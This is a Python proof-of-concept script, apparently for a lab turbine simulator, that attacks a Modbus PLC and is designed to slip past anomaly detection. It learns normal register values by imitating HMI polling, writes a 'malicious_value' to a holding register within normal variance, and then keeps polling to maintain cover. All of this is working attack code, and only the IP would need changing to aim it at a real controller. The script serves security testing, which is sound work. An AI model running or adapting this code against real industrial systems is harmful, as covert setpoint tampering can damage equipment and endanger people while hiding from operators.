#!/usr/bin/env python3
# noinspection PyTypeChecker
"""
Proof of Concept: Anomaly Detection Bypass Test
Tests whether attacks can blend with normal traffic patterns
"""

import time
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from typing import Optional, Dict, Any, List

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    "plc": {
        "ip": "127.0.0.1",
        "port": 502,
    },
    "normal_patterns": {
        "hmi_poll_interval": 1.0,
        "typical_read_size": 15,
        "typical_write_size": 3,
        "business_hours": (9, 17),
        "operational_variance": 50,
    },
    "attack": {
        "target_register": 1000,
        "normal_value": 1500,
        "malicious_value": 1490,
        "learning_cycles": 5,
        "post_attack_monitoring": 10,
    },
}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================


def is_business_hours() -> bool:
    current_hour = datetime.now().hour
    start_hour, end_hour = CONFIG["normal_patterns"]["business_hours"]
    return start_hour <= current_hour < end_hour

def log_traffic_pattern(operation: str, details: Dict[str, Any]) -> None:
    timestamp = datetime.now().isoformat()
    print(f"[{timestamp}] {operation}: {details}")

# ============================================================================
# CONNECTION & SAFE IO
# ============================================================================


def connect_to_plc(ip: str, port: int) -> Optional[ModbusTcpClient]:
    try:
        client = ModbusTcpClient(ip, port=port)
        if client.connect():
            print(f"[*] Connected to PLC at {ip}:{port}")
            return client
        print(f"[!] Failed to connect to {ip}:{port}")
        return None
    except Exception as exc:
        print(f"[!] Connection error: {exc}")
        return None


def read_registers_safely(
    client: ModbusTcpClient,
    address: int,
    count: int,
) -> Optional[List[int]]:
    try:
        result = client.read_holding_registers(address, count)  # type: ignore[arg-type]
        if result is None or result.isError():
            print(f"[!] Modbus read error at {address}")
            return None
        return result.registers
    except Exception as exc:
        print(f"[!] Read exception: {exc}")
        return None


def write_register_safely(
    client: ModbusTcpClient,
    address: int,
    value: int,
) -> bool:
    try:
        result = client.write_register(address, value)  # type: ignore[arg-type]
        if result is None or result.isError():
            print(f"[!] Modbus write error at {address}")
            return False
        return True
    except Exception as exc:
        print(f"[!] Write exception: {exc}")
        return False


# ============================================================================
# PHASES
# ============================================================================


def phase1_learn_patterns(client: ModbusTcpClient) -> Dict[str, Any]:
    print("\n" + "=" * 70)
    print("[*] PHASE 1: Learning Normal Operations")
    print("=" * 70)

    patterns: Dict[str, Any] = {
        "observed_values": [],
        "success": False,
    }

    success_count = 0

    for cycle in range(CONFIG["attack"]["learning_cycles"]):
        registers = read_registers_safely(
            client,
            CONFIG["attack"]["target_register"],
            CONFIG["normal_patterns"]["typical_read_size"],
        )

        if registers:
            patterns["observed_values"].append(registers[0])
            success_count += 1

            log_traffic_pattern(
                "Normal Read",
                {
                    "address": CONFIG["attack"]["target_register"],
                    "count": CONFIG["normal_patterns"]["typical_read_size"],
                    "value": registers[0],
                },
            )

        time.sleep(CONFIG["normal_patterns"]["hmi_poll_interval"])

    if success_count > 0:
        avg = sum(patterns["observed_values"]) / len(patterns["observed_values"])
        patterns["average_value"] = avg
        patterns["success"] = True

    return patterns


def phase2_stealthy_attack(client: ModbusTcpClient) -> bool:
    print("\n" + "=" * 70)
    print("[*] PHASE 2: Performing Stealthy Attack")
    print("=" * 70)

    registers = read_registers_safely(
        client,
        CONFIG["attack"]["target_register"],
        CONFIG["normal_patterns"]["typical_read_size"],
    )

    if not registers:
        return False

    current = registers[0]
    target = CONFIG["attack"]["malicious_value"]
    variance = abs(current - target)

    if variance > CONFIG["normal_patterns"]["operational_variance"]:
        print("[!] Change exceeds normal variance")

    if not write_register_safely(
        client,
        CONFIG["attack"]["target_register"],
        target,
    ):
        return False

    log_traffic_pattern(
        "Engineering Write",
        {
            "address": CONFIG["attack"]["target_register"],
            "old_value": current,
            "new_value": target,
            "variance": variance,
            "business_hours": is_business_hours(),
        },
    )

    verify = read_registers_safely(client, CONFIG["attack"]["target_register"], 1)
    return bool(verify and verify[0] == target)


def phase3_maintain_cover(client: ModbusTcpClient) -> None:
    for _ in range(CONFIG["attack"]["post_attack_monitoring"]):
        read_registers_safely(
            client,
            CONFIG["attack"]["target_register"],
            CONFIG["normal_patterns"]["typical_read_size"],
        )
        time.sleep(CONFIG["normal_patterns"]["hmi_poll_interval"])


# ============================================================================
# MAIN TEST
# ============================================================================


def test_anomaly_bypass(plc_ip: str, plc_port: int) -> Dict[str, Any]:
    start = datetime.now()
    results: Dict[str, Any] = {"success": False}

    client = connect_to_plc(plc_ip, plc_port)
    if not client:
        return results

    try:
        learned = phase1_learn_patterns(client)
        assert learned is not None

        if not learned.get("success"):
            return results

        time.sleep(2)

        if not phase2_stealthy_attack(client):
            return results

        time.sleep(2)
        phase3_maintain_cover(client)
        results["success"] = True

    finally:
        try:
            client.close()

        except Exception as _:   # noinspection PyBroadException
            pass

    results["duration_seconds"] = (datetime.now() - start).total_seconds()
    return results


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    print("[*] Anomaly Detection Bypass Test")
    print("[*] Ensure turbine_simulator.py is running\n")

    if input("Proceed? (yes/no): ").lower() in ("yes", "y"):
        test_anomaly_bypass(CONFIG["plc"]["ip"], CONFIG["plc"]["port"])
    else:
        print("[*] Cancelled")
